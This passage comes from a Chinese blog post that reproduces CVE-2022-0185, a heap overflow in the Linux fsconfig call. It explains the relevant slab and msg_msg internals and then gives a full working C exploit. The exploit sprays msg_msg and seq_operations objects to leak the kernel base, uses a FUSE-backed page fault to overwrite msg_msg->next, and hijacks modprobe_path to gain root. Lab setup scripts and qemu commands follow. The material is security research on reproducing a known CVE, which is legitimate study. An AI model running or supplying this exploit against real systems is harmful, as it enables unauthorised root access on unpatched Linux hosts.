ALLOC_FASTPATH);\t&#125;\tmaybe_wipe_obj_freeptr(s, object);\tif (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)\t\tmemset(object, 0, s-&gt;object_size);\tslab_post_alloc_hook(s, gfpflags, 1, &amp;object);\treturn object;&#125;static __always_inline void *slab_alloc(struct kmem_cache *s,\t\tgfp_t gfpflags, unsigned long addr)&#123;\treturn slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);&#125;\n\n这个函数其实就是对slab_alloc_node函数的套娃操作，然而slab_alloc_node函数内部首先会调用slab_pre_alloc_hook函数，起先并未注意到其返回值也是s所以并未当回事，那么现在详细分析一下\nstatic inline struct kmem_cache *slab_pre_alloc_hook(struct kmem_cache *s,\t\t\t\t\t\t     gfp_t flags)&#123;\tflags &amp;= gfp_allowed_mask;\tfs_reclaim_acquire(flags);\tfs_reclaim_release(flags);\tmight_sleep_if(gfpflags_allow_blocking(flags));\tif (should_failslab(s, flags))\t\treturn NULL;\tif (memcg_kmem_enabled() &amp;&amp;\t    ((flags &amp; __GFP_ACCOUNT) || (s-&gt;flags &amp; SLAB_ACCOUNT)))\t\treturn memcg_kmem_get_cache(s);\treturn s;&#125;\n\n可以看到最后会判断是否开启了memcg选项，并检测调用时的flags，所以也就是在这个位置导致slab改变了。\nstruct kmem_cache *memcg_kmem_get_cache(struct kmem_cache *cachep)&#123;\tstruct mem_cgroup *memcg;\tstruct kmem_cache *memcg_cachep;\tstruct memcg_cache_array *arr;\tint kmemcg_id;\tVM_BUG_ON(!is_root_cache(cachep));\tif (memcg_kmem_bypass())\t\treturn cachep;\trcu_read_lock();\tif (unlikely(current-&gt;active_memcg))\t\tmemcg = current-&gt;active_memcg;\telse\t\tmemcg = mem_cgroup_from_task(current);\tif (!memcg || memcg == root_mem_cgroup)\t\tgoto out_unlock;\tkmemcg_id = READ_ONCE(memcg-&gt;kmemcg_id);\tif (kmemcg_id &lt; 0)\t\tgoto out_unlock;\tarr = rcu_dereference(cachep-&gt;memcg_params.memcg_caches);\tmemcg_cachep = READ_ONCE(arr-&gt;entries[kmemcg_id]);\tif (unlikely(!memcg_cachep))\t\tmemcg_schedule_kmem_cache_create(memcg, cachep);\telse if (percpu_ref_tryget(&amp;memcg_cachep-&gt;memcg_params.refcnt))\t\tcachep = memcg_cachep;out_unlock:\trcu_read_unlock();\treturn cachep;&#125;\n\n进入函数内部查看会发现其就是对额外的结构体做的一系列操作\nmsg_msg至此可以开始认真分析关于此利用方法了，首先考虑的是如何实现泄漏内核地址。我们知道msg_msg结构体如下:\n/* one msg_msg structure for each message */struct msg_msg &#123;\tstruct list_head m_list;\tlong m_type;\tsize_t m_ts;\t\t/* message text size */\tstruct msg_msgseg *next;\tvoid *security;\t/* the actual message follows immediately */&#125;;\n\n其中next指针指向的是msg_msgseg结构体，而这个结构体在前面的文章中提到过，当我们发送的消息大小大于0xfd0时将超出范围的内容补充到msg_msgseg结构体，总体结构就是一个单向链表的结构。这里选择的办法肯定不能是内存搜索，这样存在的问题太多了，很容易造成kernel panic。\nstatic struct msg_msg *alloc_msg(size_t len)&#123;\tstruct msg_msg *msg;\tstruct msg_msgseg **pseg;\tsize_t alen;\talen = min(len, DATALEN_MSG);\tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\tif (msg == NULL)\t\treturn NULL;\tmsg-&gt;next = NULL;\tmsg-&gt;security = NULL;\tlen -= alen;\tpseg = &amp;msg-&gt;next;\twhile (len &gt; 0) &#123;\t\tstruct msg_msgseg *seg;\t\tcond_resched();\t\talen = min(len, DATALEN_SEG);\t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\t\tif (seg == NULL)\t\t\tgoto out_err;\t\t*pseg = seg;\t\tseg-&gt;next = NULL;\t\tpseg = &amp;seg-&gt;next;\t\tlen -= alen;\t&#125;\treturn msg;out_err:\tfree_msg(msg);\treturn NULL;&#125;\n\n关注msg_msgseg结构体的分配过程可以知道的是在Linux kernel 5.4版本依旧是通过普通的slab申请的，所以这里的选择是尽可能小的生成msg_msgseg结构体，随后使用seq_operations结构体来泄漏出内核基地址。\nstruct seq_operations &#123;    void * (*start) (struct seq_file *m, loff_t *pos);    void (*stop) (struct seq_file *m, void *v);    void * (*next) (struct seq_file *m, void *v, loff_t *pos);    int (*show) (struct seq_file *m, void *v);&#125;;\n\n在以往的文章中介绍过这个结构体，这里简单提一下，这个结构体是内部全为函数指针的结构体，所以可以很轻松的泄漏。按照a3的做法，这里泄漏的办法是在每生成一个msg_msgseg时就分配一个seq_operations结构体，在最后完成msg_msg结构体的堆喷之后又大量堆喷seq_operations结构体，这样可以大大提高成功率使二者挨在一起再通过修改m_ts成员即可实现泄漏。\n那么接下来需要考虑的是任意地址写的问题了\nstruct msg_msg *load_msg(const void __user *src, size_t len)&#123;\tstruct msg_msg *msg;\tstruct msg_msgseg *seg;\tint err = -EFAULT;\tsize_t alen;\tmsg = alloc_msg(len);\tif (msg == NULL)\t\treturn ERR_PTR(-ENOMEM);\talen = min(len, DATALEN_MSG);\tif (copy_from_user(msg + 1, src, alen))\t\tgoto out_err;\tfor (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) &#123;\t\tlen -= alen;\t\tsrc = (char __user *)src + alen;\t\talen = min(len, DATALEN_SEG);\t\tif (copy_from_user(seg + 1, src, alen))\t\t\tgoto out_err;\t&#125;\terr = security_msg_msg_alloc(msg);\tif (err)\t\tgoto out_err;\treturn msg;out_err:\tfree_msg(msg);\treturn ERR_PTR(err);&#125;\n\n这里可以注意到的是在对msg_msg写完之后会进入下面的for循环，其会根据next指针然后再进行写，后面的写就是写入到msg_msgseg结构体中了。如果我们能够在第一次写的时候修改掉msg_msg-&gt;next指针即可实现任意地址写了。\n面对上面的思路，使用userfaultfd是很明显可以实现的，不过既然这篇文章提到了FUSE那么这里肯定就使用FUSE了，不过思路都是一样的。所以这里的整体思路就是通过mmap创建两块连续的内存区域，让后一块内存区域和FUSE挂载点下的文件做映射，那么在读取下一块内存时就会进入到我们预先写到的read函数中去了，在这个处理函数中使用fsconfig中的漏洞去修改掉msg_msg-&gt;next指针，在结束处理函数之后就会继续往已经被我们修改的指针地址写入内容了，完成了任意地址写。这里因为只泄漏了内核基地址所以这里写的地方也选择的是modprobe_path进行提权。\n综上可得exp#define _GNU_SOURCE#define FUSE_USE_VERSION 34#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;linux/mount.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sched.h&gt;#include &lt;errno.h&gt;#include &lt;stddef.h&gt;#include &lt;fuse.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define MSG_QUEUE_NUM 0x50#define SEQ_FILE_NUM 0x100#define PRIMARY_MSG_TYPE 0x41size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*] status has been saved.&quot;);&#125;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    uint64_t next;  /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;void errExit(char *err_msg)&#123;    puts(err_msg);    system(&quot;/bin/sh&quot;);    exit(-1);&#125;void prepare_mod()&#123;    system(&quot;mkdir -p /tmp&quot;);    system(&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;chmod +x /tmp/copy.sh&quot;);    system(&quot;echo -e &#x27;\\\\xFF\\\\xFF\\\\xFF\\\\xFF&#x27; &gt; /tmp/dummy&quot;);    system(&quot;chmod +x /tmp/dummy&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void unshare_setup(uid_t uid, gid_t gid)&#123;    int temp;    char edit[0x100];    unshare(CLONE_NEWNS | CLONE_NEWUSER);    temp = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);    write(temp, &quot;deny&quot;, strlen(&quot;deny&quot;));    close(temp);    temp = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, uid);    write(temp, edit, strlen(edit));    close(temp);    temp = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, gid);    write(temp, edit, strlen(edit));    close(temp);    return;&#125;int fsopen(const char *fs_name, unsigned int flags)&#123;    return syscall(__NR_fsopen, fs_name, flags);&#125;int fsconfig(int fsfd, unsigned int cmd,             const char *key, const void *val, int aux)&#123;    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);&#125;uint64_t modprobe_path = -1;int exp_fs_fd = -1;int pipe_fd[2];const char *evil_path = &quot;evil&quot;;int change_next()&#123;    char fake_msg[0x100];    ((struct msg_msg *)fake_msg)-&gt;m_list.next = *(uint64_t *)&quot;0x196082&quot;;    ((struct msg_msg *)fake_msg)-&gt;m_list.prev = *(uint64_t *)&quot;0x196082&quot;;    ((struct msg_msg *)fake_msg)-&gt;m_type = *(uint64_t *)&quot;0x196082&quot;;    ((struct msg_msg *)fake_msg)-&gt;m_ts = *(uint64_t *)&quot;0x196082&quot;;    ((struct msg_msg *)fake_msg)-&gt;next = modprobe_path;    ((struct msg_msg *)fake_msg)-&gt;security = *(uint64_t *)&quot;0x196082&quot;;    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, &quot;\\x00&quot;, fake_msg + 1, 0);    write(pipe_fd[1], &#x27;A&#x27;, 1);&#125;int evil_read(const char *path, char *buf, size_t size, off_t offset,              struct fuse_file_info *fi)&#123;    char evil_buf[0x1000];    char rev;    if (offset &gt;= 0x1000)        return -1;    else if (offset + size &gt; 0x1000)        size = 0x1000 - offset;    read(pipe_fd[0], &amp;modprobe_path, 8);    memset(evil_buf, 0, sizeof(evil_buf));    strcpy(evil_buf, &quot;/tmp/shell.sh&quot;);    memcpy(buf, evil_buf + offset, size);    read(pipe_fd[0], &amp;rev, 1);    return size;&#125;int evil_getattr(const char *path, struct stat *stbuf,                 struct fuse_file_info *fi)&#123;    int res = 0;    memset(stbuf, 0, sizeof(struct stat));    if (strcmp(path, &quot;/&quot;) == 0)    &#123;        stbuf-&gt;st_mode = S_IFDIR | 0755;        stbuf-&gt;st_nlink = 2;    &#125;    else if (strcmp(path + 1, evil_path) == 0)    &#123;        stbuf-&gt;st_mode = S_IFREG | 0666;        stbuf-&gt;st_nlink = 1;        stbuf-&gt;st_size = 0x1000;    &#125;    else    &#123;        res = -ENOENT;    &#125;    return res;&#125;int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,                 off_t offset, struct fuse_file_info *fi,                 enum fuse_readdir_flags flags)&#123;    if (strcmp(path, &quot;/&quot;) != 0)        return -ENOENT;    filler(buf, &quot;.&quot;, NULL, 0, 0);    filler(buf, &quot;..&quot;, NULL, 0, 0);    filler(buf, evil_path, NULL, 0, 0);&#125;static const struct fuse_operations evil_ops = &#123;    .getattr = evil_getattr,    .readdir = evil_readdir,    .read = evil_read,&#125;;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x20 - sizeof(struct msg_msgseg)];&#125; primary_msg;unsigned long kernel_addr = -1; // single_startunsigned long kernel_base = 0xffffffff81000000;unsigned long kernel_offset;char *evil_args[] = &#123;&quot;exploit&quot;, &quot;./temp&quot;, NULL&#125;;int main(int argc, char **argv, char **envp)&#123;    save_status();    evil_args[0] = argv[0];    char *buf = malloc(0x4000);    unsigned long *point_buf = malloc(0x4000);    int victim_qid = -1;    int msqid[MSG_QUEUE_NUM];    char fake_secondary_msg[704];    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    int fs_fd[0x10];    char m_ts_buf[0x10];    int seq_fd[SEQ_FILE_NUM];    cpu_set_t cpu_set;    unshare_setup(getuid(), getgid());    CPU_ZERO(&amp;cpu_set);    CPU_SET(0, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    if (pipe(pipe_fd) &lt; 0)        errExit(&quot;[-] FAILED to open pipe!&quot;);    if (!fork())    &#123;        if (fuse_main(sizeof(evil_args) / sizeof(char *) - 1, evil_args,                      &amp;evil_ops, NULL) != 0)            errExit(&quot;[-] FAILED to create FUSE!&quot;);    &#125;    for (int i = 0; i &lt; 30; i++)    &#123;        int ms_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);        int ret = 0;        if (ms_qid &lt; 0)        &#123;            puts(&quot;[x] msgget!&quot;);            return -1;        &#125;        *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;        memset(&amp;primary_msg.mtext, &quot;\\x00&quot;, sizeof(primary_msg) - sizeof(long));        ret = msgsnd(ms_qid, &amp;primary_msg, 0xfd0 - 8, MSG_TAG);        if (ret &lt; 0)        &#123;            printf(&quot;[x] error at sending msg_msg on %d queue\\n&quot;, i);            printf(&quot;%d\\n&quot;, ret);            errExit(&quot;failed to send primary msg!&quot;);        &#125;    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);        if (msqid[i] &lt; 0)        &#123;            puts(&quot;[x] msgget!&quot;);            return -1;        &#125;    &#125;    puts(&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM / 2; i++)    &#123;        int ret = 0;        *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;        memset(&amp;primary_msg.mtext, &#x27;A&#x27; + i, sizeof(primary_msg) - sizeof(long));        ret = msgsnd(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, MSG_TAG);        if (ret &lt; 0)        &#123;            printf(&quot;[x] error at sending msg_msg on %d queue\\n&quot;, i);            printf(&quot;%d\\n&quot;, ret);            errExit(&quot;failed to send primary msg!&quot;);        &#125;        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0)            errExit(&quot;FAILED to open /proc/self/stat!&quot;);    &#125;    fs_fd[0] = fsopen(&quot;ext4&quot;, 0);    if (fs_fd[0] &lt; 0)        errExit(&quot;failed to fsopen!&quot;);    for (int i = 0; i &lt; 255; i++)        fsconfig(fs_fd[0], FSCONFIG_SET_STRING, &quot;aaaaaaa&quot;, &quot;bbbbbbb&quot;, 0);    fsconfig(fs_fd[0], FSCONFIG_SET_STRING, &quot;0x196082&quot;, &quot;pwned&quot;, 0);    for (int i = MSG_QUEUE_NUM / 2; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;        memset(&amp;primary_msg.mtext, &#x27;A&#x27; + i, sizeof(primary_msg) - sizeof(long));        if (msgsnd(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, MSG_TAG) &lt; 0)        &#123;            errExit(&quot;failed to send primary msg!&quot;);        &#125;        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0)            errExit(&quot;FAILED to open /proc/self/stat!&quot;);    &#125;    puts(&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;);    memset(m_ts_buf, &#x27;\\0&#x27;, sizeof(m_ts_buf));    *((long *)m_ts_buf) = 0xfd0 + 0xff0;    fsconfig(fs_fd[0], FSCONFIG_SET_STRING, &quot;\\x00&quot;, &quot;196082196082196082ya7&quot;, 0);    fsconfig(fs_fd[0], FSCONFIG_SET_STRING, &quot;\\x00&quot;, m_ts_buf, 0);    puts(&quot;[*] spray more seq_operations...&quot;);    for (int i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++)    &#123;        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0)            errExit(&quot;FAILED to open /proc/self/stat!&quot;);    &#125;    puts(&quot;[*] checking for oob reading...&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        uint64_t recv_size;        // memset(buf, &#x27;\\0&#x27;, 0xfd0 + 0xfd0);        recv_size = msgrcv(msqid[i], buf, 0xfd0 + 0xff0 - 8 + 0x10, 0, MSG_COPY | IPC_NOWAIT);        if (recv_size &lt; 0)        &#123;            printf(&quot;Error code :%d\\n&quot;, recv_size);            printf(&quot;Error index:%d\\n&quot;, i);            errExit(&quot;FAILED to msgrcv(MSG_COPY)!&quot;);        &#125;        if (recv_size == (0xfd0 + 0x18))            continue;        for (int j = 0; j &lt; (0xfd0 + 0xfd0); j += 8)        &#123;            if (*(uint64_t *)(buf + j) &gt; kernel_base &amp;&amp; (*(uint64_t *)(buf + j) &amp; 0xfff) == 0x140)            &#123;                printf(&quot;[+] get data leak: %p\\n&quot;, *(uint64_t *)(buf + j));                kernel_addr = *(uint64_t *)(buf + j);                kernel_base = kernel_addr - 0x36f140;                kernel_offset = kernel_base - 0xffffffff81000000;                break;            &#125;        &#125;        if (kernel_addr != -1)            break;    &#125;    if (kernel_addr == -1)        errExit(&quot;failed to leak kernel base!&quot;);    modprobe_path = 0xffffffff82891780 + kernel_offset;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%lx  &quot;, kernel_base);    printf(&quot;\\033[32m\\033[1moffset: \\033[0m%lx\\n&quot;, kernel_offset);    printf(&quot;[+] modprobe_path: %lx\\n&quot;, modprobe_path);    write(pipe_fd[1], &amp;modprobe_path, 8);    prepare_mod();    int evil_file_fd;    int ms_qid;    evil_file_fd = open(&quot;./temp/evil&quot;, O_RDWR);    if (evil_file_fd &lt; 0)        errExit(&quot;[-] FAILED to open evil file in FUSE!&quot;);    char *nearby_page = (char *)mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE,                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);    char *evil_page = (char *)mmap((void *)0x1338000, 0x1000, PROT_READ | PROT_WRITE,                                   MAP_SHARED | MAP_FIXED, evil_file_fd, 0);    if (evil_page != (char *)0x1338000)        errExit(&quot;[-] FAILED to map for FUSE file!&quot;);    memset(nearby_page, &#x27;a&#x27;, 0x1000);    int i = 1;    while (1)    &#123;        printf(&quot;try %d\\n&quot;, i);        if ((ms_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);        exp_fs_fd = fsopen(&quot;ext4&quot;, 0);        if (exp_fs_fd &lt; 0)            errExit(&quot;failed to fsopen!&quot;);        // write(pipe_fd[1], &amp;exp_fs_fd, 4);        for (int i = 0; i &lt; 255; i++)            fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, &quot;aaaaaaa&quot;, &quot;bbbbbbb&quot;, 0);        fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, &quot;0x196082&quot;, &quot;pwned&quot;, 0);        pthread_t thr;        pthread_create(&amp;thr, NULL, change_next, NULL);        if (msgsnd(ms_qid, evil_page - 0xfd0 + 0x8, 0xfd0 + 0x18, MSG_TAG) &lt; 0)            errExit(&quot;failed to send primary msg!&quot;);        pthread_join(thr, NULL);        i++;        system(&quot;/tmp/dummy&quot;);        int flag_fd = open(&quot;/flag&quot;, O_RDWR);        if (flag_fd &gt; 0)        &#123;            puts(&quot;[+] Successfully overwrite the modprobe_path!&quot;);            break;        &#125;    &#125;    return 0;&#125;\n\n踩坑记首先在虚拟机中跑FUSE时踩了一个大坑，在一篇文章中( 这里提到的文章就不放出来了，可能是师傅们不小心写错了 )指出FUSE无法在ctf环境中运行是因为bzImage的问题，经过询问发现其问题主要是文件系统过于残缺导致的。随后听取a3佬的意见更多的学习了fuse原理之后成功解决了问题，我这里使用的是syzkaller中的工具使用debootstrap搭建的一个文件系统\n#!/usr/bin/env bash# Copyright 2016 syzkaller project authors. All rights reserved.# Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.# create-image.sh creates a minimal Debian Linux image suitable for syzkaller.set -eux# Create a minimal Debian distribution in a directory.DIR=chrootPREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring,libselinux1-dev,fuse3,libfuse3-3,libfuse3-dev,libfuse2,libfuse-dev# If ADD_PACKAGE is not defined as an external environment variable, use our default packagesif [ -z $&#123;ADD_PACKAGE+x&#125; ]; then    ADD_PACKAGE=&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;fi# Variables affected by optionsARCH=$(uname -m)RELEASE=bullseyeFEATURE=minimalSEEK=2047PERF=false# Display help functiondisplay_help() &#123;    echo &quot;Usage: $0 [option...] &quot; &gt;&amp;2    echo    echo &quot;   -a, --arch                 Set architecture&quot;    echo &quot;   -d, --distribution         Set on which debian distribution to create&quot;    echo &quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;    echo &quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;    echo &quot;   -h, --help                 Display help message&quot;    echo &quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \\$KERNEL at first&quot;    echo&#125;while true; do    if [ $# -eq 0 ];then        echo $#        break    fi    case &quot;$1&quot; in        -h | --help)            display_help            exit 0        ;;        -a | --arch)            ARCH=$2            shift 2        ;;        -d | --distribution)            RELEASE=$2            shift 2        ;;        -f | --feature)            FEATURE=$2            shift 2        ;;        -s | --seek)            SEEK=$(($2 - 1))            shift 2        ;;        -p | --add-perf)            PERF=true            shift 1        ;;        -*)            echo &quot;Error: Unknown option: $1&quot; &gt;&amp;2            exit 1        ;;        *)  # No more options            break        ;;    esacdone# Handle cases where qemu and Debian use different arch namescase &quot;$ARCH&quot; in    ppc64le)        DEBARCH=ppc64el    ;;    aarch64)        DEBARCH=arm64    ;;    arm)        DEBARCH=armel    ;;    x86_64)        DEBARCH=amd64    ;;    *)        DEBARCH=$ARCH    ;;esac# Foreign architectureFOREIGN=falseif [ $ARCH != $(uname -m) ]; then    # i386 on an x86_64 host is exempted, as we can run i386 binaries natively    if [ $ARCH != &quot;i386&quot; -o $(uname -m) != &quot;x86_64&quot; ]; then        FOREIGN=true    fifiif [ $FOREIGN = &quot;true&quot; ]; then    # Check for according qemu static binary    if ! which qemu-$ARCH-static; then        echo &quot;Please install qemu static binary for architecture $ARCH (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;        exit 1    fi    # Check for according binfmt entry    if [ ! -r /proc/sys/fs/binfmt_misc/qemu-$ARCH ]; then        echo &quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-$ARCH does not exist&quot;        exit 1    fifi# Double check KERNEL when PERF is enabledif [ $PERF = &quot;true&quot; ] &amp;&amp; [ -z $&#123;KERNEL+x&#125; ]; then    echo &quot;Please set KERNEL environment variable when PERF is enabled&quot;    exit 1fi# If full feature is chosen, install more packagesif [ $FEATURE = &quot;full&quot; ]; then    PREINSTALL_PKGS=$PREINSTALL_PKGS&quot;,&quot;$ADD_PACKAGEfisudo rm -rf $DIRsudo mkdir -p $DIRsudo chmod 0755 $DIR# 1. debootstrap stageDEBOOTSTRAP_PARAMS=&quot;--arch=$DEBARCH --no-check-gpg --include=$PREINSTALL_PKGS --components=main,contrib,non-free,non-free-firmware $RELEASE $DIR&quot;if [ $FOREIGN = &quot;true&quot; ]; then    DEBOOTSTRAP_PARAMS=&quot;--foreign $DEBOOTSTRAP_PARAMS&quot;fi# riscv64 is hosted in the debian-ports repository# debian-ports doesn&#x27;t include non-free, so we exclude firmware-atherosif [ $DEBARCH == &quot;riscv64&quot; ]; then    DEBOOTSTRAP_PARAMS=&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros $DEBOOTSTRAP_PARAMS http://deb.debian.org/debian-ports&quot;fisudo --preserve-env=http_proxy,https_proxy,ftp_proxy,no_proxy debootstrap $DEBOOTSTRAP_PARAMS# 2. debootstrap stage: only necessary if target != host architectureif [ $FOREIGN = &quot;true&quot; ]; then    sudo cp $(which qemu-$ARCH-static) $DIR/$(which qemu-$ARCH-static)    sudo chroot $DIR /bin/bash -c &quot;/debootstrap/debootstrap --second-stage&quot;fi# Set some defaults and enable promtless ssh to the machine for root.sudo sed -i &#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27; $DIR/etc/passwdecho &#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27; | sudo tee -a $DIR/etc/inittabprintf &#x27;\\nauto eth0\\niface eth0 inet dhcp\\n&#x27; | sudo tee -a $DIR/etc/network/interfacesecho &#x27;/dev/root / ext4 defaults 0 0&#x27; | sudo tee -a $DIR/etc/fstabecho &#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27; | sudo tee -a $DIR/etc/fstabecho &#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27; | sudo tee -a $DIR/etc/fstabecho &#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27; | sudo tee -a $DIR/etc/fstabecho &#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27; | sudo tee -a $DIR/etc/fstabecho -en &quot;127.0.0.1\\tlocalhost\\n&quot; | sudo tee $DIR/etc/hostsecho &quot;nameserver 8.8.8.8&quot; | sudo tee -a $DIR/etc/resolve.confecho &quot;syzkaller&quot; | sudo tee $DIR/etc/hostnamessh-keygen -f $RELEASE.id_rsa -t rsa -N &#x27;&#x27;sudo mkdir -p $DIR/root/.ssh/cat $RELEASE.id_rsa.pub | sudo tee $DIR/root/.ssh/authorized_keys# Add perf supportif [ $PERF = &quot;true&quot; ]; then    cp -r $KERNEL $DIR/tmp/    BASENAME=$(basename $KERNEL)    sudo chroot $DIR /bin/bash -c &quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;    sudo chroot $DIR /bin/bash -c &quot;cd /tmp/$BASENAME/tools/perf/; make&quot;    sudo chroot $DIR /bin/bash -c &quot;cp /tmp/$BASENAME/tools/perf/perf /usr/bin/&quot;    rm -r $DIR/tmp/$BASENAMEfi# Add udev rules for custom drivers.# Create a /dev/vim2m symlink for the device managed by the vim2m driverecho &#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27; | sudo tee -a $DIR/etc/udev/rules.d/50-udev-default.rules# Build a disk imagedd if=/dev/zero of=$RELEASE.img bs=1M seek=$SEEK count=1sudo mkfs.ext4 -F $RELEASE.imgsudo mkdir -p /mnt/$DIRsudo mount -o loop $RELEASE.img /mnt/$DIRsudo cp -a $DIR/. /mnt/$DIR/.sudo umount /mnt/$DIR\n\n因为我也稍做了点修改，怕以后忘记了这里贴出来记录一下。\n第二个坑就是关于上面提到的内部隔离问题，同样也是在某位师傅的博客文章中提到了在linux kernel 5.14以前不存在内部隔离问题，随即居然以下犯上去说a3师傅写的ctfwiki错了，在经过几天挣扎之后终于注意到了在linux kernel 5.9以前的内部隔离实现。\n再记录一下编译选项\ngcc exp.c -masm=intel -static -no-pie -Wall -D_FILE_OFFSET_BITS=64 -I./libfuse libfuse3.a -g -lpthread -o exp -w# make fusesudo mount bullseye.img rootfssudo cp exp rootfs/home/testobjdump -d ./exp &gt; exp.txtsudo mkdir rootfs/home/test/tempsudo umount rootfsqemu-system-x86_64 \\  -cpu kvm64,+smep,+smap \\  -kernel ./vmlinux \\  -append &quot;console=ttyS0 root=/dev/sda rw&quot; \\  -hda ./bullseye.img \\  -enable-kvm -m 3G -nographic \\  -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \\  -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \\  -s\n\n\n参考链接：\n​    https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/\n​    https://zhuanlan.zhihu.com/p/93592262\n​    https://www.willsroot.io/2022/01/cve-2022-0185.html\n​    https://elixir.bootlin.com/linux/v5.4/source\n​    https://github.com/Crusaders-of-Rust/CVE-2022-0185\n","categories":["Linux Kernel","CVE复现"],"tags":["msg_msg","pipe_buffer","Filesystem","fuse","seq_operations"]},{"title":"CVE-2022-0995复现","url":"/2023/08/21/CVE-2022-0995/","content":"前言其实前两天复现了一个2023的CVE，本来打算写那一个的，但是对于那个CVE更多的是做工作上的适配，在一些小细节上的原理并没有掌握得特别透彻，并且因为是刚刚公开的一个CVE也导致没有更多的文章进行参考，等后面进一步分析一下源码再写。\n此次的CVE是存在于观察队列事件通知子系统 (watch_queue event notification subsystem) 中的一个堆溢出漏洞，该漏洞从内核版本5.8伴随着 watch queue subsystem 引入，在 5.17-rc4 